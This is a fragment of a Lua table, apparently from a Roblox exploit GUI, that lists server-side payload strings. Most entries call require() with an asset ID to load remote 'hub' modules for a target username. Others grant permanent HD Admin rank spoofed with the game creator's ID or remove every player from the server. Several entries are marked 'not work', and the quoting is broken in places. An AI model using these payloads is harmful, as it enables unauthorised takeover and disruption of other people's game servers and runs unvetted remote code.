...
return {
	...
	CoolKiddForsaken = "require(89709417365094).Forsaken("%username%", "c00lkidd")",
	R6 = "require(4585652241).load('%username%')",
	EDITL0LHUB = "require(14829670677).EDITL0L("%username%")",
	GetHDADMINv1 = "_G.HDAdminMain:GetModule("cf"):SetRank(game:GetService("Players")["%username%"], game.CreatorId, 5, "Perm")",
	GetHDADMINv2 = "require(7192763922).load("%username%")",
	NEK0wuronya = "require(134825709410639).Burenyuu("%username%")",
	RemoveDataModel = "game.Players:ClearAllChildren()",
	SinsationHub = "require(100263845596551)("%username%")",
	F3X = "require(4869378421).F3X('%username%')",
	UndetectedHub = "not work",
	PoliceAI = "not work')",
	TankAI = "not work')",
	JuggernautAI = "not work"
}
end;
};
G2L_MODULES[G2L["91"]] = {
